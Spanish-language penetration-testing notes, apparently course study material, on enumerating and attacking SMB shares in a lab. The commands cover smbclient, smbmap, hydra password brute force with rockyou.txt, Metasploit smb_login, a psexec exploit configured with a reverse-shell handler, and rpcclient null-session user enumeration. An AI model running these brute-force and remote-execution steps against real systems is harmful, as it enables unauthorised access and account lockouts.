# SMB — notas prácticas

**Autor:** Josema — [LinkedIn](https://www.linkedin.com/in/tu-usuario/)
**Fuente:** Curso "El Rincón del Hacker" (Mario) — apuntes personales
**Estado:** **LAB** (solo para entornos autorizados)

> ⚠️ Uso legal: estos apuntes son solo para laboratorios y entornos autorizados. No los uses contra sistemas reales sin permiso.

---

## Objetivo

Enumerar y acceder a recursos SMB; evaluar permisos y, en entornos controlados, probar vectores de explotación (psexec, rpc, etc.).

---

## 1) Escaneo inicial (sin credenciales)

```bash
# listar shares sin usuario ni contraseña (anon)
smbclient -L 10.0.8.11 -N
```

* `-L` lista recursos compartidos.
* `-N` intenta conexión anónima (sin contraseña).
* Anota shares visibles (`Users`, `ADMIN$`, `IPC$`, ...).

---

## 2) Escaneo con credenciales y ver permisos

```bash
smbmap -H 10.0.8.11 -u 'mario' -p '123123'
```

Salida ejemplo:

```
Disk                                                    Permissions     Comment
----                                                    -----------     -------
ADMIN$                                                  NO ACCESS       Remote Admin
C$                                                      NO ACCESS       Default share
IPC$                                                    NO ACCESS       Remote IPC
Users                                                   READ ONLY
[*] Closed 1 connections
```

**Interpretación:**

* `NO ACCESS` → sin permisos sobre ese share.
* `READ ONLY` → solo lectura (podemos descargar, no subir).
* `smbmap` da una visión rápida de permisos y tamaños.

---

## 3) Fuerza bruta de contraseñas 

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://10.0.8.11
```

* `-l` usuario único; `-P` wordlist.
* Muy ruidoso: puede bloquear cuentas o disparar alertas.

---

## 4) Conectar a un recurso descubierto

```bash
smbclient -U 'mario' //10.0.8.11/Users
# o automatizar: smbclient -U 'mario%123123' //10.0.8.11/Users
```

Comandos útiles dentro de `smbclient`:

* `ls` listar
* `get <file>` descargar
* `put <file>` subir (si tienes permiso)
* `exit` salir

Montar con CIFS (útil para análisis local):

```bash
sudo mount -t cifs //10.0.8.11/Users /mnt/smb \
  -o user=mario,pass=123123,vers=3.0
# desmontar: sudo umount /mnt/smb
```

Ajusta `vers=` según la versión SMB del objetivo.

---

## 5) Metasploit — comprobación de logins y psexec

### Scanner (smb_login)

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.0.8.11
set SMBUser mario
set PASS_FILE /usr/share/wordlists/rockyou.txt
set VERBOSE false
run
```

* `RHOSTS` = objetivo(s).
* `PASS_FILE` para fuerza bruta controlada.
* `VERBOSE false` reduce ruido en la consola.

### Intento de explotación (psexec) — ejemplo

```text
use exploit/windows/smb/psexec
set RHOSTS 10.0.8.11
set SMBUser mario
set SMBPass 123123
set LHOST 10.0.8.12
set LPORT 4444
run
```

Salida típica si falla por permisos:

```
[*] Started reverse TCP handler on 10.0.8.12:4444
[*] 10.0.8.11:445 - Connecting to the server...
[*] 10.0.8.11:445 - Authenticating to 10.0.8.11:445 as user 'mario'...
[-] 10.0.8.11:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.
```

**Nota:** `ACCESS_DENIED` suele indicar que la cuenta no tiene privilegios remotos o que el servicio requerido está restringido. Normal en máquinas parcheadas.

---

## 6) rpcclient — enumeración avanzada

```bash
rpcclient -U "" -N 10.0.8.11
```

Comandos útiles dentro de `rpcclient`:

```
rpcclient $> srvinfo        # versión Samba, server type, etc.
rpcclient $> enumdomusers   # lista usuarios locales/dom
```

Salida ejemplo:

```
DISCOVER       Wk Sv PrQ Unx NT SNT Samba 4.13.13-Debian
platform_id     :       500
os version      :       6.1
server type     :       0x809a03

user:[ken] rid:[0x3e8]
user:[takeshi] rid:[0x3e9]
```

**Tips:** `enumdomusers` es útil para obtener candidatos a ataques de fuerza bruta o enumeración de cuentas.

---

## 7) Flujo de trabajo recomendado (rápido)

1. `smbclient -L <host> -N` → listar shares públicos.
2. `smbmap -H <host> -u <user> -p <pass>` → ver permisos y ficheros.
3. Si no hay credenciales: `hydra` o `auxiliary/scanner/smb/smb_login` (solo en LAB).
4. Con credenciales: `smbclient //host/share -U user` o `mount.cifs`.
5. Para ejecución remota: probar `psexec` y analizar errores (`ACCESS_DENIED`).
6. Más enumeración con `rpcclient`.

---

## 8) Buenas prácticas

* **No subir** credenciales reales al repo. Añade `*.key`, `.env` y similares a `.gitignore`.
* Documenta siempre: comando → salida → interpretación.
* Guarda ejemplos y capturas en `examples/` sin datos sensibles.
* Si un exploit falla por `ACCESS_DENIED`, revisa permisos, UAC y SMB signing/config.

---

*Pequeño tip técnico:* si ves `NO ACCESS` en shares administrativos (`C$`, `ADMIN$`) y tienes credenciales válidas, probablemente necesites una cuenta con privilegios de administrador remoto o que el servicio `Server` acepte ejecución remota (WMI/SMB). No te frustres: es normal y parte del juego.

---

*Status:* listo para pegar en `04-Explotacion-Host/smb.md`.

*Si quieres, lo puedo convertir en una versión más corta para la sección `cheatsheet/` con comandos rápidos y sin explicaciones.*
